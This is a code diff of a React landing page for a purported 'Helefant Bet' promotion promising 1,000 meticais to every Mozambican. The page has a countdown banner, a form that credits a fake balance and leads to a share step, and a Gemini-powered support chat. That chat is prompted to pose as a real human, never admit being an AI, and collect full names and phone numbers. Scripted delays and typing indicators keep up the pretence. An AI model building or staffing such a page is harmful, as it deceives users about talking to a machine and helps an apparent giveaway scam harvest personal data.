@@ -15,6 +15,14 @@ import LoadingOverlay from './components/LoadingOverlay';
 import { GoogleGenAI } from "@google/genai";
 
 const STORAGE_KEY = 'helefant_chat_history_v5';
+const SUBMISSION_KEY = 'helefant_submitted_token';
+
+// Links das imagens de fundo - Verificados para garantir visibilidade total
+const BACKGROUND_IMAGES = [
+  "https://images.unsplash.com/photo-1534120247760-c44c3e4a62f1?auto=format&fit=crop&q=80&w=1920", // Foto 1: Mecânico Africano
+  "https://images.unsplash.com/photo-1544928147-79a2dbc1f389?auto=format&fit=crop&q=80&w=1920", // Foto 2: Mãe no Mercado (Moçambique/África)
+  "https://images.unsplash.com/photo-1523240795612-9a054b0db644?auto=format&fit=crop&q=80&w=1920"  // Foto 3: Grupo de jovens brancos em ONG/Voluntariado
+];
 
 const App: React.FC = () => {
   const [currentStep, setCurrentStep] = useState<AppStep>(AppStep.FORM);
@@ -22,11 +30,20 @@ const App: React.FC = () => {
   const [daysRemaining, setDaysRemaining] = useState(17);
   const [balance, setBalance] = useState(0);
   const [isInitialLoading, setIsInitialLoading] = useState(true);
+  const [bgIndex, setBgIndex] = useState(0);
   
-  // Chat State moved to App level to handle background replies
+  // Chat State
   const [chatMessages, setChatMessages] = useState<any[]>([]);
   const [unreadCount, setUnreadCount] = useState(0);
   const [isAgentTyping, setIsAgentTyping] = useState(false);
+
+  // Background Carousel Logic - Troca a cada 5 segundos
+  useEffect(() => {
+    const bgInterval = setInterval(() => {
+      setBgIndex((prev) => (prev + 1) % BACKGROUND_IMAGES.length);
+    }, 5000);
+    return () => clearInterval(bgInterval);
+  }, []);
 
   // Persistence for chat
   useEffect(() => {
@@ -52,7 +69,6 @@ const App: React.FC = () => {
     return () => clearTimeout(timer);
   }, []);
 
-  // Sync unread count: clear when support is open
   useEffect(() => {
     if (currentStep === AppStep.SUPPORT) {
       setUnreadCount(0);
@@ -68,12 +84,11 @@ const App: React.FC = () => {
         model: "gemini-3-flash-preview",
         contents: `Você é o Mestre Suporte da Helefant Bet Moçambique.
           - Protocolo: Peça o NOME completo, depois o TELEFONE. Só resolva o problema após os dados.
-          - Se o cliente mandou áudio, você ouviu e entendeu o problema perfeitamente.
           - Estilo: Moçambicano profissional, humanizado, empático.
           Histórico: ${context}
           Nova Mensagem: ${userText}`,
         config: {
-          systemInstruction: "Aja como um atendente real. Não diga que é IA. Use gírias leves como 'Bay', 'Estamos juntos', 'Taco'. Responda entre 20 a 60 segundos.",
+          systemInstruction: "Aja como um atendente real. Não diga que é IA. Use gírias leves como 'Bay', 'Estamos juntos'. Responda entre 20 a 60 segundos.",
           temperature: 0.8,
         },
       });
@@ -87,19 +102,15 @@ const App: React.FC = () => {
     const updated = [...chatMessages, msg];
     setChatMessages(updated);
 
-    // Realistic Timing Logic (20s to 60s)
     const possibleDelays = [22000, 35000, 58000];
     const totalDelay = possibleDelays[Math.floor(Math.random() * possibleDelays.length)];
     
-    // 1. Seen Receipt
     setTimeout(() => {
       setChatMessages(prev => prev.map(m => m.id === msg.id ? { ...m, read: true } : m));
     }, totalDelay * 0.6);
 
-    // 2. Typing start
     setTimeout(() => setIsAgentTyping(true), totalDelay * 0.85);
 
-    // 3. Final Response
     setTimeout(async () => {
       const replyText = await getGeminiResponse(msg.text, updated);
       setIsAgentTyping(false);
@@ -111,14 +122,12 @@ const App: React.FC = () => {
       };
       setChatMessages(prev => [...prev, agentMsg]);
       
-      // Notify if not looking at chat
       if (currentStep !== AppStep.SUPPORT) {
         setUnreadCount(prev => prev + 1);
       }
     }, totalDelay);
   };
 
-  // Countdown logic for the banner
   useEffect(() => {
     const startDateKey = 'helefant_promo_start_date';
     let startDate = localStorage.getItem(startDateKey);
@@ -138,6 +147,7 @@ const App: React.FC = () => {
   }, []);
 
   const handleFormSubmit = (data: UserData) => {
+    localStorage.setItem(SUBMISSION_KEY, 'true');
     setUserData(data);
     setBalance(1000);
     setCurrentStep(AppStep.SHARE);
@@ -161,7 +171,6 @@ const App: React.FC = () => {
         onHomeClick={() => setCurrentStep(AppStep.FORM)}
       />
       
-      {/* Botão Flutuante de Suporte com Notificação Vermelha */}
       {currentStep !== AppStep.SUPPORT && (
         <button
           onClick={handleSupportClick}
@@ -179,22 +188,44 @@ const App: React.FC = () => {
       {currentStep === AppStep.FORM && (
         <section className="relative w-full min-h-[90vh] flex items-center justify-center overflow-hidden">
           <div className="absolute inset-0 z-0">
-            <img src="https://images.unsplash.com/photo-1531123897727-8f129e1688ce?auto=format&fit=crop&q=80&w=1920" alt="Helefant Promo" className="w-full h-full object-cover" />
+            {BACKGROUND_IMAGES.map((img, index) => (
+              <img 
+                key={img}
+                src={img} 
+                alt="Helefant Promo Background" 
+                className={`absolute inset-0 w-full h-full object-cover transition-opacity duration-[1500ms] ease-in-out ${index === bgIndex ? 'opacity-100' : 'opacity-0'}`} 
+              />
+            ))}
             <div className="absolute inset-0 bg-slate-950/70 mix-blend-multiply"></div>
             <div className="absolute inset-0 bg-gradient-to-b from-slate-950/40 via-emerald-900/60 to-slate-950"></div>
           </div>
           <div className="relative z-10 w-full max-w-6xl px-4 py-20 text-center">
             <span className="inline-block px-8 py-3 mb-8 text-sm font-black tracking-[0.4em] uppercase bg-emerald-500 text-slate-950 rounded-full">EXPIRA EM {daysRemaining} DIAS</span>
-            <h1 className="text-5xl md:text-8xl font-black leading-[1.1] tracking-tighter text-white">ESTAMOS A DAR <span className="text-emerald-400">1.000 METICAIS</span></h1>
-            <p className="max-w-3xl mx-auto mt-10 text-lg md:text-2xl text-slate-100 font-medium italic">A Helefant Bet celebra o faturamento recorde distribuindo prémios instantâneos.</p>
-            <button onClick={() => document.getElementById('solicitar')?.scrollIntoView({ behavior: 'smooth' })} className="mt-16 bg-emerald-500 text-slate-950 px-12 py-5 rounded-2xl font-black text-xl uppercase tracking-widest hover:bg-emerald-400 transition-all shadow-[0_20px_50px_-10px_rgba(16,185,129,0.5)]">SOLICITAR AGORA</button>
+            <h1 className="text-4xl md:text-7xl font-black leading-[1.1] tracking-tighter text-white uppercase">ESTAMOS A DAR <span className="text-emerald-400">1.000 METICAIS</span> PARA TODOS OS MOÇAMBICANOS</h1>
+            <p className="max-w-4xl mx-auto mt-10 text-lg md:text-2xl text-slate-100 font-medium leading-relaxed">
+              helefant conpany esta a oferece 1000 meticais para todos os moçambicanos, devido ao faturamento de 125 milhoes de meticais. siga a instruçoes abaixo e revendique o seu premium
+            </p>
+            <button 
+              onClick={() => document.getElementById('solicitar')?.scrollIntoView({ behavior: 'smooth' })} 
+              className="mt-16 bg-emerald-500 text-slate-950 px-12 py-5 rounded-2xl font-black text-xl uppercase tracking-widest hover:bg-emerald-400 transition-all shadow-[0_20px_50px_-10px_rgba(16,185,129,0.5)]"
+            >
+              RECEBER AGORA
+            </button>
           </div>
         </section>
       )}
 
-      <main id="solicitar" className="w-full max-w-6xl px-4 py-12 flex flex-col items-center min-h-[60vh]">
+      <main className="w-full max-w-6xl px-4 py-12 flex flex-col items-center min-h-[60vh]">
         {currentStep === AppStep.FORM && (
-          <><Stats /><div className="w-full max-w-4xl mt-12 bg-white/[0.02] border border-white/5 p-8 md:p-16 rounded-[4rem] backdrop-blur-3xl shadow-2xl"><StepForm onSubmit={handleFormSubmit} /></div><div className="w-full mt-32"><Testimonials /></div></>
+          <>
+            <Stats />
+            <div className="w-full max-w-4xl mt-12 bg-white/[0.02] border border-white/5 p-8 md:p-16 rounded-[4rem] backdrop-blur-3xl shadow-2xl">
+              <StepForm onSubmit={handleFormSubmit} />
+            </div>
+            <div className="w-full mt-32">
+              <Testimonials />
+            </div>
+          </>
         )}
         {currentStep === AppStep.WINNERS && <StepWinners onBack={() => setCurrentStep(AppStep.FORM)} />}
         {currentStep === AppStep.EARNINGS && <StepEarnings balance={balance} userData={userData} onBack={() => setCurrentStep(AppStep.FORM)} />}
